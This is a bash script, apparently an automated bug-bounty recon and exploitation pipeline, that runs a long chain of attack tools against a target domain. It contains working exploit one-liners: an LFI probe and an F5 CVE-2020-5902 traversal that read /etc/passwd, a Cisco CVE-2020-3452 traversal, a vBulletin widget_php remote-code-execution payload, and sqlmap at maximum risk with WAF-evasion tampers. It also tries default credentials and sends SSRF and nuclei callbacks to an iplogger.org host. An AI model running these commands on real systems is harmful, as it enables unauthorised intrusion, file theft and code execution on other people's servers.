RED='\033[0;31m'
NC='\033[0m' # No Color
printf " ${RED}AutoScanner${NC}\n"

#mkdir exploit

printf "1.${RED} Passive Active URLs File: subdomain/httpx_success_URLS_$1.txt${NC}\n"
printf "2.${RED} passive Active Subdomain File: subdomain/httpx_success_subdomain_$1.txt${NC}\n"
printf "3.${RED} Final merge of 1 and Wayback_Gau URLs: subdomain/final_urls.txt${NC}\n"
printf "4.${RED} Final merge of 1 and Wayback_Gau Subdomains: subdomain/final_subdomains.txt${NC}\n"
printf "5.${RED} Raw Waybackurl File: waybackurl_gau/waybackurls_output_$1.txt${NC}\n"
printf "6.${RED} FIlter waybacks and gau merge file:  waybackurl_gau/Final_WaybackGau_$1.txt${NC}\n"

#Generating Nuclei Output file for scanning
mkdir exploit/nuclei
printf "${RED}Generating Nuclei Output file for scanning...${NC}\n"
#cat subdomain/final_urls.txt waybackurl_gau/Final_WaybackGau_$1.txt >> tmp/temp_nuclei.txt
cp subdomain/final_urls.txt exploit/nuclei/Nuclei_to_Scan.txt
#sort -u tmp/temp_nuclei.txt >> exploit/nuclei/Nuclei_to_Scan.txt
#rm -f tmp/*

#WebScreenshot
printf "${RED}WebScreenShot...${NC}\n"
mkdir exploit/webscreenshot
eyewitness --web -x subdomain/final_urls.txt --no-prompt --no-dns --threads 70 -d exploit/webscreenshot/

#Directory Listing...
printf "${RED}Directory Bruteforce..${NC}\n"
mkdir exploit/directory_bruteforce
#ffuf -w MyWordlist/all_all.txt -p "0.1-1.0" -mc 200,302,301,403 -fw 0,1 -recursion -recursion-depth 2 -t 300 -o exploit/directory_bruteforce/ffuf_$1.html -of html -c -v -u /FUZZ
python3 ffufplus.py

#Open Redirection
mkdir exploit/openredirect
printf "${RED}Finding Open Redirection${NC}\n"
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -a -i \=http | qsreplace 'example.com' | while read host do;do curl -s -L $host -l |grep "example.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | tee -a exploit/openredirect/openredirect_example_com_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -a -i \=http | qsreplace 'tinyurl.com' | while read host do;do curl -s -L $host -l |grep "tinyurl.com" && echo -e "$host \033[0;31mVulnerable\n" ;done | tee -a exploit/openredirect/openredirect_tinyurl_$1.txt
cat exploit/openredirect/openredirect_example_com_$1.txt | grep "Vulnerable" | tee -a exploit/openredirect/vulnerable_example_com.txt
cat exploit/openredirect/openredirect_tinyurl_$1.txt | grep "Vulnerable" | tee -a exploit/openredirect/vulnerable_tinyurl_com.txt
rm -f tmp/*

#Finding Keys
printf "${RED}Finding keys${NC}\n"
mkdir exploit/keys
cat waybackurl_gau/Final_WaybackGau_$1.txt | unfurl --unique keys | tee -a exploit/keys/unfurl_keys_$1.txt

#Finding js,PHP,ASPX,ASP,JSP  files from wayback_gau_urls..
mkdir exploit/files_extension
printf "${RED}Finding js,PHP,ASPX,ASP,JSP  files from wayback_gau_urls..${NC}\n"
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -P "\w+\.js(\?|$)" | sort -u | tee -a exploit/files_extension/JS_files_$1.txt
cat waybackurl_gau/waybackurls_output_paypal.com.txt | grep '\.js$' | sort -u | httpx -status-code -mc 200 -content-type | grep 'application/javascript' | awk '{print $1}' | tee -a exploit/files_extension/JS_Files.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -P "\w+\.php(\?|$)" | sort -u | tee -a exploit/files_extension/PHP_files_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -P "\w+\.aspx(\?|$)" | sort -u | tee -a exploit/files_extension/ASPX_files_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -P "\w+\.asp(\?|$)" | sort -u | tee -a exploit/files_extension/ASP_files_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | grep -P "\w+\.jsp(\?|$)" | sort -u | tee -a exploit/files_extension/JSP_files_$1.txt

#Making XSS Payload...
printf "${RED}Making XSS Payload..${NC}\n"
mkdir exploit/xss
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf xss |tee -a exploit/xss/XSS_Payload_$1.txt
cat exploit/xss/XSS_Payload_$1.txt | kxss | tee -a exploit/xss/KXSS_XSS_Otput_$1.txt
cat waybackurl_gau/Final_WaybackGau_paypal.com.txt | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=lollol/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done >> exploit/xss/Custom_Xss_Manually_Check.txt
cat waybackurl_gau/waybackurls_output_$1.txt | gf xss| sed 's/=.*/=/' | sed 's/URL: //' | tee exploit/xss/Dalfox_testxss.txt
dalfox file exploit/xss/Dalfox_testxss.txt -b lazytest.xss.ht pipe -o exploit/xss/dalfoxout

#Making SSRF Payload...
printf "${RED}Making SSRF Payload...${NC}\n"
mkdir exploit/ssrf
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf ssrf | sort -u | tee -a exploit/ssrf/SSRF_payload_$1.txt
cat exploit/ssrf/SSRF_payload_$1.txt | qsreplace "https://iplogger.org/1ygAp7.jpg" | tee -a exploit/ssrf/SSRF_FUZZ.txt
ffuf -c -w SSRF_FUZZ.txt -u FUZZ -t 200 -o exploit/ssrf/SSRF_FFUF_Output_$1.txt
echo "Check https://iplogger.org/logger/4a74ya1ygAp7/ for SSRF response.."


#Possible LFI,Base64,debug-page,debug-logic,idor,img-traversal,interestingEXT,rce,redirect,s3-buckets,sqli ...Check file manually..
printf "${RED}Possible LFI,Base64,debug-page,debug-logic,idor,img-traversal,interestingEXT,rce,redirect,s3-buckets,sqli ...Check file manually...${NC}\n"
mkdir exploit/others
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf lfi | sort -u | tee -a exploit/others/LFI_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf base64 | sort -u | tee -a exploit/others/Base64_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf debug-pages | sort -u | tee -a exploit/others/debug-pages_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf idor | sort -u | tee -a exploit/others/IDOR_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf img-traversal | sort -u | tee -a exploit/others/img-traversal_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf interestingEXT |  sort -u | tee -a exploit/others/interestingEXT_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf rce | sort -u | tee -a exploit/others/RCE_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | qsreplace hostname | sort -u | tee -a exploit/others/RCE_hostname_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf redirect| sort -u | tee -a exploit/others/Redirect_$1.txt
#cat waybackurl_gau/Final_WaybackGau_$1.txt | gf s3-buckets| sort -u | tee -a exploit/others/s3-buckets_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf sqli | sort -u | tee -a exploit/others/SQLI_$1.txt
cat waybackurl_gau/Final_WaybackGau_$1.txt | gf debug_logic| sort -u | tee -a exploit/others/debug_logic_$1.txt

#LFI
mkdir exploit/LFI
cat waybackurl_gau/clean_merge_gau_waybackurls_out.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee -a exploit/LFI/LFI.txt

#SQLI
printf "${RED}SQLI...${NC}\n"
mkdir exploit/SQLI
sqlmap -m exploit/others/SQLI_$1.txt --dbs --batch --random-agent --level=5 --risk=3 tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned | tee -a exploit/SQLI/SQLmap.txt

#Subdomain Takeover...
printf "${RED}Subdomain Takeover...${NC}\n"
wget https://raw.githubusercontent.com/Ice3man543/SubOver/master/providers.json
mkdir exploit/subdomaintakeover
SubOver -l subdomain/final_subdomains.txt -t 30 -https  | tee -a exploit/subdomaintakeover/SubOver_Subdomain_Takeover_Check.txt
rm providers.json

#CVE-2020-5902
printf "${RED}CVE-2020-5902...${NC}\n"
mkdir exploit/CVE-2020-5902
cat subdomain/final_urls.txt | while read url;do curl -s -L -k $url/favicon.ico | python3 -c 'import mmh3,sys,codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))';done | tee -a exploit/CVE-2020-5902/faviconhash.txt
cat exploit/CVE-2020-5902/faviconhash.txt | sort -u | tee -a exploit/CVE-2020-5902/filterfaviconhash.txt
cat exploit/CVE-2020-5902/filterfaviconhash.txt | while read hash do; do shodan search http.favicon.hash:$hash "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}';done | tee -a exploit/CVE-2020-5902/CVEFuzz.txt
cat exploit/CVE-2020-5902/CVEFuzz.txt | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done | tee -a exploit/CVE-2020-5902/CVE-2020-5902_output.txt

#vBulletin 5.6.2 - widget_tabbedContainer_tab_panel Remote Code Execution
mkdir exploit/vBulletin
cat exploit/CVE-2020-5902/filterfaviconhash.txt | while read hash do; do shodan search http.favicon.hash:$hash --fields ip_str,port --separator " " | awk '{print $1":"$2}';done | tee -a exploit/vBulletin/fuzz.txt
cat exploit/vBulletin/fuzz.txt | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done; | tee -a exploit/vBulletin/output.txt

#CVE-2020-3452
printf "${RED}CVE-2020-3452...${NC}\n"
mkdir exploit/CVE-2020-3452
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < subdomain/final_subdomains.txt | tee -a exploit/CVE-2020-3452/vulnerable.txt

#Domain to IP convert..
printf "${RED}Domain to IP convert..${NC}\n"
mkdir exploit/Subdomain_to_IP
cat subdomain/final_subdomains.txt | httpx -ip -cdn -cname -sr HTTPresponse -title -vhost | tee -a exploit/Subdomain_to_IP/Subdomain_to_IP_$1.txt 
cat exploit/Subdomain_to_IP/Subdomain_to_IP_$1.txt | tr "[" " " | tr "]" " " | awk '{print $2}' | tee -a exploit/Subdomain_to_IP/SubdomainIPOnly_$1.txt
cat exploit/Subdomain_to_IP/Subdomain_to_IP_$1.txt | tr "[" " " | tr "]" " " | awk '{print $3}' | tee -a exploit/Subdomain_to_IP/Subdomain_Titles_$1.txt
cat exploit/Subdomain_to_IP/Subdomain_to_IP_$1.txt | tr "[" " " | tr "]" " " | awk '{print $3}' | grep ".amazonaws.com" | tee -a exploit/Subdomain_to_IP/Subdomain_AWS_$1.txt


#Port Scanning
printf "${RED}Port Scanning...${NC}\n"
mkdir exploit/portscan
naabu -p 21,23,25,100,1000,10000,10001,10134,102,1023,1024,10243,1025,10250,1026,1027,1029,104,10443,1050,10554,1080,1099,11,110,11000,111,1110,1111,11112,11211,113,11300,1153,1177,119,1200,12000,121,1234,12345,1250,1290,13,1311,135,13579,1388,1400,14147,14265,143,1433,1471,1494,15,1500,1515,1521,1554,1588,1599,16010,1604,161,1650,16992,16993,17,17000,1723,1741,175,179,180,18081,18245,1883,19,1900,1911,1935,1947,195,1950,1962,1981,1990,20,2000,20000,2001,2002,2003,2006,2008,2010,2012,2018,2020,2021,2022,20256,2030,2031,2048,2049,2050,2051,2052,2053,2054,20547,2055,2056,2057,2058,2059,2060,2061,2062,2063,2064,2065,2066,2067,2068,2069,2070,2077,2079,2080,2081,2082,2083,2086,2087,2095,2096,21,2100,21025,211,2111,2121,2122,2126,21379,2150,2181,22,2200,2201,2202,221,2211,222,2220,2221,2222,22222,2223,2225,2232,2233,2250,2259,2266,23,23023,2320,2323,2332,23424,2345,2351,2352,2375,2376,2379,2382,2404,2443,2455,2480,25,25001,2506,25105,2525,2548,2549,2550,2551,2552,2554,2555,2556,25565,2557,2558,2559,2560,2561,2562,2563,2566,2567,2568,2569,2570,2572,2598,26,2601,2602,2626,264,2701,27015,27017,2709,2761,2762,28017,2806,2985,3000,3001,3002,3005,3048,3049,3050,3051,3052,3053,3054,3056,3057,3058,3060,3061,3062,3066,3067,3068,3069,3070,3071,3072,3073,3075,3078,3079,3080,3081,3083,3084,3085,3086,3087,3088,3089,3090,3091,3092,3093,3095,3096,3098,3099,3100,3101,3102,3103,3104,3105,3106,3107,3108,3109,311,3110,3111,3112,3113,3114,3115,3116,3117,3118,3119,3120,3121,3128,3129,3200,3211,3221,32400,3260,3270,32764,3299,3306,33060,3310,3311,3333,3337,3388,3389,3400,3401,3402,3405,3406,3410,3412,3443,3460,3479,3498,35000,3503,3521,3522,3523,3524,3541,3542,3548,3549,3550,3551,3552,3554,3555,3556,3557,3558,3559,3560,3561,3562,3563,3566,3567,3568,3569,3570,3689,3690,37,3702,37215,3749,37777,3780,3790,3791,3792,3793,3794,3838,389,3910,3922,3950,3951,3952,3953,3954,4000,4001,4002,4010,4022,4040,4043,4063,4064,4100,4117,4157,41800,4200,4242,4282,43,4321,4369,443,4430,4433,444,4443,4445,445,447,448,44818,449,450,4500,4505,4506,4523,4524,4545,4567,4643,4646,465,4664,4730,4747,4782,4786,4840,4848,4899,49,4911,49152,49153,4949,4999,5000,50000,5001,5002,5003,5004,5005,50050,5006,5007,50070,5009,5010,50100,5011,502,5025,503,5050,5051,5070,5080,5090,5100,51106,5122,51235,515,5150,5172,5190,5201,5209,5222,5269,5280,52869,53,5321,5353,5357,5400,54138,5431,5432,5443,5446,5454,548,5494,5500,5501,554,5542,55442,55443,555,5555,55553,55554,5560,5567,5568,5569,5577,5590,5591,5592,5593,5594,5595,5596,5597,5598,5599,5600,5601,5602,5603,5604,5605,5606,5607,5608,5609,5672,5673,5678,5800,5801,5822,5853,5858,587,5900,5901,5906,5907,5908,59080,5909,5910,5938,5984,5985,5986,6000,60001,6001,6002,6003,6004,6005,6006,6007,6008,6009,6010,6036,6080,6102,6161,62078,6262,6264,6308,631,6352,636,6363,6379,6443,6464,6503,6510,6511,6512,6543,6550,6560,6561,6565,6580,6581,6588,6590,6600,6601,6602,6603,6605,6622,6633,6650,6653,666,6662,6664,6666,6667,6668,6697,6748,6789,685,6887,6955,6998,70,7000,7001,7002,7003,7004,7005,7010,7014,7070,7071,7080,7081,7090,7170,7171,7218,7401,7415,7433,7443,7444,7445,7465,7474,7493,7500,7510,7535,7537,7547,7548,7634,7654,7657,7676,7700,771,777,7776,7777,7778,7779,7788,7887,789,79,7979,7998,7999,80,800,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,801,8010,8011,8012,8013,8014,8015,8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,8029,8030,8031,8032,8033,8034,8035,8036,8037,8038,8039,8040,8041,8042,8043,8044,8045,8046,8047,8048,8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,806,8060,8064,8066,8069,8071,8072,808,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,81,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,8111,8112,8118,8123,8126,8139,8140,8143,8159,8180,8181,8182,8184,8190,82,8200,8222,8236,8237,8238,8239,8241,8243,8248,8249,8251,8252,8282,8291,83,830,8333,8334,8383,84,8401,8402,8403,8404,8405,8406,8407,8408,8409,8410,8411,8412,8413,8414,8415,8416,8417,8418,8419,8420,8421,8422,8423,8424,8425,8426,8427,8428,8429,843,8430,8431,8432,8433,8442,8443,8444,8445,8446,8447,8448,85,8500,8513,8545,8553,8554,8585,8586,8590,86,8602,8621,8622,8623,8637,8649,8663,8666,8686,8688,87,8700,873,8733,8765,8766,8767,8779,8782,8784,8787,8788,8789,8790,8791,88,880,8800,8801,8802,8803,8804,8805,8806,8807,8808,8809,8810,8811,8812,8813,8814,8815,8816,8817,8818,8819,8820,8821,8822,8823,8824,8825,8826,8827,8828,8829,8830,8831,8832,8833,8834,8835,8836,8837,8838,8839,8840,8841,8842,8843,8844,8845,8846,8847,8848,8849,8850,8851,8852,8853,8854,8855,8856,8857,8858,8859,8860,8861,8862,8863,8864,8865,8866,8867,8868,8869,8870,8871,8872,8873,8874,8875,8876,8877,8878,8879,888,8880,8881,8885,8887,8888,8889,8890,8891,8899,89,8935,8969,8988,8989,8990,8991,8993,8999,90,9000,9001,9002,9003,9004,9005,9006,9007,9008,9009,9010,9011,9012,9013,9014,9015,9016,9017,9018,9019,902,9020,9021,9022,9023,9024,9025,9026,9027,9028,9029,9030,9031,9032,9033,9034,9035,9036,9037,9038,9039,9040,9041,9042,9043,9044,9045,9046,9047,9048,9049,9050,9051,9070,9080,9082,9084,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,91,9100,9101,9102,9103,9104,9105,9106,9107,9108,9109,9110,9111,9119,9123,9136,9151,9160,9189,9191,9199,92,9200,9201,9202,9203,9204,9205,9206,9207,9208,9209,9210,9211,9212,9213,9214,9215,9216,9217,9218,9219,9220,9221,9222,9251,9295,9299,9300,9301,9302,9303,9304,9305,9306,9307,9308,9309,9310,9311,9389,9418,9433,9443,9444,9445,95,9500,9527,9530,9550,9595,96,9600,9606,9633,9663,9682,9690,97,9704,9743,9761,9765,98,9861,9869,9876,9898,9899,99,990,992,993,9943,9944,995,9950,9955,9966,9981,9988,999,9990,9991,9992,9993,9994,9997,9998,9999 -iL subdomain/final_subdomains.txt -c 60 -o exploit/portscan/Port_Scan_$1.txt -
cat exploit/portscan/Port_Scan_$1.txt | grep -v "80" | grep -v "443" | tee -a exploit/portscan/Interesting_Ports_$1.txt
naabu -iL raw_data/merge__subdomain_raw.txt -c 80 -o exploit/portscan/Port_Scan_raw_$1.txt
cat exploit/portscan/Port_Scan_raw_$1.txt | grep -v "80" | grep -v "443" | tee -a exploit/portscan/Interesting_Ports_Raw_$1.txt
cat exploit/portscan/Port_Scan_$1.txt | tr ":" " " | awk '{print $2}' | sort -u | tr "\n" ","| cut -c1- >> exploit/portscan/openports.txt

#Nmap Service Scan
mkdir exploit/portscan/nmap
var=$(<exploit/portscan/openports.txt)
nmap -sS -Pn -T4 -sV --min-parallelism 50 -n --open -oA exploit/portscan/nmap/nmapscan -iL subdomain/final_subdomains.txt -p "$var" -v

#Finding RocketMq exploit
printf "${RED}Finding RocketMq issue...${NC}\n"
mkdir exploit/rocketmqexploit
nmap -sS --script=http-title -Pn -T4 -n --open -oA exploit/rocketmqexploit/rocketmqcheckrocketmqcheck -iL subdomain/final_subdomains.txt -p 1022,11000,18081,2021,2080,2222,3000,3082,3333,443,5000,6080,6666,6789,7000,7070,7080,7676,7777,7788,80,8000,8001,8003,8005,8008,8010,8011,8012,8018,8030,8033,8050,8060,8069,8080,8082,8085,8086,8088,8090,8091,8097,8098,8099,81,8102,8110,8123,8180,8182,82,8282,8333,8383,8410,8443,8585,8765,8782,8787,88,8800,8804,8811,8847,8848,8849,8876,8888,8899,8989,8999,9000,9009,9011,9080,9090,9092,9200,9201,9205,9300,9500,9898,9988,9990,9993,9998,9999 -v
cat exploit/rocketmqexploit/rocketmqcheck.nmap | grep "rocketmq" >> exploit/rocketmqexploit/rocketmqexploit.txt
echo 'Example: curl -sI http://116.62.25.245:8080/ | grep "rocketmq"'


#WebScreenshot
#printf "${RED}WebScreenShot...${NC}\n"
#mkdir exploit/webscreenshot
#eyewitness -x exploit/portscan/nmap/nmapscan.xml --no-dns --threads 70 -d exploit/webscreenshot/

#Find Spring-Boot issue https://medium.com/@Asm0d3us/weaponizing-favicon-ico-for-bugbounties-osint-and-what-not-ace3c214e139
printf "${RED}Find Spring-Boot issue ...${NC}\n"
mkdir exploit/subdomainfavicon
mkdir exploit/spring_boot
cat subdomain/final_urls.txt | python3 Scripts/FavFreak/favfreak.py -o exploit/subdomainfavicon/FavFreakOut --shodan | tee -a exploit/subdomainfavicon/Favicon_Hash_$1.txt
cat exploit/subdomainfavicon/Favicon_Hash_$1.txt | grep 'DORK' | awk '{print $3}' >> exploit/subdomainfavicon/Favicon_Shodan_Dorks.txt
cat exploit/subdomainfavicon/Favicon_Shodan_Dorks.txt | while read line; do shodan search org:"'"$2"'" $line --fields ip_str,port --separator " "|awk '{print $1":"$2}'; done >> exploit/subdomainfavicon/Subdomain_Favicon_To_IP.txt
cat exploit/subdomainfavicon/Subdomain_Favicon_To_IP.txt | while read host; do ffuf -u http://$host/FUZZ -mc 200 -w MyWordlist/spring-boot.txt -o exploit/spring_boot/Favicon_Spring_Boot_$host -of html; done


#Trying WAF Bypass to find IP Address
#printf "${RED}Trying WAF Bypass to find IP Address...${NC}\n"
#mkdir exploit/waf
#cat subdomain/final_subdomains.txt | while read line;do echo "$line: "; Scripts/bypass-firewalls-by-DNS-history/bypass-firewalls-by-DNS-history.sh -d "$line" -a -o exploit/waf/WAF_Bypass_IP.txt ;done  >> exploit/waf/waf_debug.txt

#Check subdomain for S3 Buckets..
printf "${RED}Check subdomain for S3 Buckets..${NC}\n"
mkdir exploit/s3
ffuf -w subdomain/final_subdomains.txt -u http://FUZZ.s3.amazonaws.com -w subdomain/final_subdomains.txt -o exploit/s3/S3_Bucket_Check -of html -p "0.1-1.0" -mc 200 -t 300 -c -v

#Admin_Login Page finder
printf "${RED}Admin_Login_Page Finder${NC}\n"
mkdir exploit/admin_login_page
python3 Scripts/admin_login.py

#Directory Listing...
#printf "${RED}Directory Bruteforce..${NC}\n"
#mkdir exploit/directory_bruteforce
#ffuf -w MyWordlist/all_all.txt -p "0.1-1.0" -mc 200,302,301,403 -fw 0,1 -recursion -recursion-depth 2 -t 300 -o exploit/directory_bruteforce/ffuf_$1.html -of html -c -v -u /FUZZ
#python3 ffufplus.py

#Check for default credentials of device
printf "${RED}Check for default credentials of device.........${NC}\n"
mkdir exploit/default_login
cat subdomain/httpx_success_URLS_$1.txt | ffuf -w - -u FUZZ -mr "assword" -s >>  exploit/default_login/login_portals.txt
Scripts/default-http-login-hunter/default-http-login-hunter.sh exploit/default_login/login_portals.txt | tee -a exploit/default_login/defaultcredentials_$1.txt

#Run Nuclei
printf "${RED}Run Nuclei.........${NC}\n"
nuclei -list exploit/nuclei/Nuclei_to_Scan.txt -t /root/nuclei-templates/ -o exploit/nuclei/nucleiout -interactsh-url https://iplogger.org/1ygAp7.jpg -stats




printf "${RED}..........................................Exploit_Done................................................${NC}\n"

